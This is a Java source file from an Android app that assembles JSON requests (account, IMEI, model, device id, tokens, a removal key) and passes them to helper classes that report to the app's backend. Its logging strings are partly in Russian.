package com.inet.android.request;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

import com.inet.android.info.GetInfo;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public class RequestList {
	final private static String LOG_TAG = RequestList.class.getSimpleName()
			.toString();

	/**
	 * Sending a request for a first token
	 */
	public static void sendRequestForFirstToken(Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		Logging.doLog(
				LOG_TAG,
				"send sendRequestForFirstToken, account: "
						+ sp.getString("account", "account"));

		TokenRequest tr = new TokenRequest(mContext);
		tr.sendRequest(1);
	}

	/**
	 * Sending start request
	 */
	public static void sendStartRequest(Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		Logging.doLog(
				LOG_TAG,
				"send start request, account: "
						+ sp.getString("account", "account"));

		JSONObject jsonObject = new JSONObject();
		try {
			jsonObject.put("account", sp.getString("account", "0000"));
			jsonObject.put("imei", sp.getString("imei", "imei"));
			jsonObject.put("model", sp.getString("model", "0000"));
		} catch (JSONException e) {
			e.printStackTrace();
		}

		String str = jsonObject.toString();
		StartRequest sr = new StartRequest(mContext);
		sr.sendRequest(str);
	}

	/**
	 * Sending a status request
	 */
	public static void sendCheckRequest(Context mContext) {
		Logging.doLog(LOG_TAG, "send CheckRequest", "send CheckRequest");

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		JSONObject jsonObject = new JSONObject();
		try {
			jsonObject.put("account", sp.getString("account", "0000"));
			jsonObject.put("device", sp.getString("device", "0000"));
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "что-то не так с json",
					"что-то не так с json");
			e.printStackTrace();
		}

		String str = jsonObject.toString();

		CheckRequest cr = new CheckRequest(mContext);
		cr.sendRequest(str);

	}

	/**
	 * Sending a token APP device
	 */
	public static void sendTokenAppRequest(Context mContext) {
		Logging.doLog(LOG_TAG, "requestTask start", "requestTask start");

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		JSONObject jsonObject = new JSONObject();
		try {

			jsonObject.put("device", sp.getString("device", "0000"));
			jsonObject.put("account", sp.getString("account", "0000"));
			jsonObject.put("token", sp.getString("time_setub", ""));

		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "что-то не так с json",
					"что-то не так с json");
			e.printStackTrace();
		}
		String str = jsonObject.toString();
		AppTokenRequest ar = new AppTokenRequest(mContext);
		ar.sendRequest(str);

	}

	/**
	 * Sending a request for a second token
	 */
	public static void sendRequestForSecondToken(Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		Logging.doLog(
				LOG_TAG,
				"send sendRequestForSecondToken, account: "
						+ sp.getString("account", "account"));

		TokenRequest tr = new TokenRequest(mContext);
		tr.sendRequest(2);
	}

	/**
	 * Sending periodic query
	 */
	public static void sendPeriodicRequest(Context mContext) {
		Logging.doLog(LOG_TAG, "sendPeriodicRequest", "sendPeriodicRequest");

		PeriodicRequest pr = new PeriodicRequest(mContext);
		pr.sendRequest(null);

	}

	/**
	 * Sending data request
	 */
	public static void sendDataRequest(String req, Context mContext) {
		
		Logging.doLog(LOG_TAG, "send data request", "send data request: ");
		DataRequest dataReq = new DataRequest(mContext);
		dataReq.sendRequest(req);
	}
	/**
	 * Sending service data request
	 */
	public static void sendDataRequest(String area, String event, Context mContext) {
		String sendJSONStr = null;
	
		try {
			
			JSONObject info = new JSONObject();
			JSONObject object = new JSONObject();
			info.put("area", area);
			info.put("event", event);

			object.put("time", ConvertDate.logTime());
			object.put("type", "12");
			object.put("info", info);
			sendJSONStr = object.toString();
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
		}
		Logging.doLog(LOG_TAG, "send data request", "send data request: ");
		DataRequest dataReq = new DataRequest(mContext);
		dataReq.sendRequest(sendJSONStr);
	}
	
	/**
	 * Sending demand request
	 */
	public static void sendDemandRequest(String request, String infoType, String complete,
			String version, Context mContext) {
		OnDemandRequest dr = new OnDemandRequest(infoType, complete,
				version, mContext);
		dr.sendRequest(request);
	}
	
	
	/**
	 * Sending demand request
	 */
	public static void sendInfoDeviceRequest(Context mContext) {
		
		GetInfo getInfo = new GetInfo(mContext);
		getInfo.startGetInfo();
	}
	
	
	/**
	 * Send a request for removal
	 */
	public static void sendDelRequest(Context mContext) {
		Logging.doLog(LOG_TAG, "sendDelRequest start", "sendDelRequest start");

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		JSONObject jsonObject = new JSONObject();
		try {
			jsonObject.put("device", sp.getString("device", "0000"));
			jsonObject.put("account", sp.getString("account", "0000"));
			jsonObject.put("key", sp.getString("key_removal", "-1"));
			jsonObject.put("mode", "1");
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "что-то не так с json",
					"что-то не так с json");
			e.printStackTrace();
		}

		String str = jsonObject.toString();
		DelRequest dr = new DelRequest(mContext);
		dr.sendRequest(str);
	}
}
